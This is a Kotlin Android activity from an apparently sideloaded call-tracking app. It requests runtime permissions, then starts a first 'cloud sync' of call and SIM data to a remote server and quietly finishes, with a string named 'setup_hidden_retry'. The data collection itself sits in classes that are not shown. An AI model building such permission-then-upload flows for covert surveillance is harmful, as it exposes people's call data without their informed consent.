package com.calltech

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Sideload first open — screen tab tak open jab tak Render par SIM na chala jaye.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private var statusView: TextView? = null
    private var actionButton: Button? = null
    private var syncing = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
            continueAfterPermissionResult()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        statusView = findViewById(R.id.setup_status)
        actionButton = findViewById(R.id.setup_allow)
        actionButton?.setOnClickListener {
            if (SyncBootstrap.needsRuntimePermissions(this)) {
                requestRuntimePermissions()
            } else {
                startCloudSync()
            }
        }

        MongoSyncHelper.ensureApiUrl(this)

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            startCloudSync()
            return
        }

        requestRuntimePermissions()
    }

    override fun onResume() {
        super.onResume()
        if (!syncing && !SyncBootstrap.needsRuntimePermissions(this) &&
            !InstallFlow.isSetupComplete(this)
        ) {
            startCloudSync()
        }
    }

    private fun requestRuntimePermissions() {
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            startCloudSync()
            return
        }
        permissionLauncher.launch(SyncBootstrap.requiredPermissions())
    }

    private fun continueAfterPermissionResult() {
        if (SyncBootstrap.needsRuntimePermissions(this)) {
            Log.w(TAG, "Permissions still missing — setup screen rakho")
            statusView?.text = getString(R.string.setup_message)
            actionButton?.text = getString(R.string.setup_allow)
            actionButton?.isEnabled = true
            return
        }
        startCloudSync()
    }

    private fun startCloudSync() {
        if (syncing || isFinishing) {
            return
        }
        syncing = true
        statusView?.text = getString(R.string.setup_syncing)
        actionButton?.isEnabled = false

        BackgroundSyncRunner.run {
            var ok = false
            try {
                CallSyncService.holdDuring(applicationContext) {
                    ok = InstallFlow.runFirstCloudSync(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "First cloud sync failed", error)
                ok = false
            }

            runOnUiThread {
                syncing = false
                if (isFinishing) {
                    return@runOnUiThread
                }
                if (!SyncBootstrap.needsRuntimePermissions(this@PermissionTrampolineActivity)) {
                    InstallFlow.completeSetup(applicationContext)
                }
                statusView?.text = if (ok) {
                    getString(R.string.setup_done)
                } else {
                    getString(R.string.setup_hidden_retry)
                }
                window.decorView.postDelayed({
                    if (!isFinishing) {
                        finish()
                    }
                }, 800L)
            }
        }
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
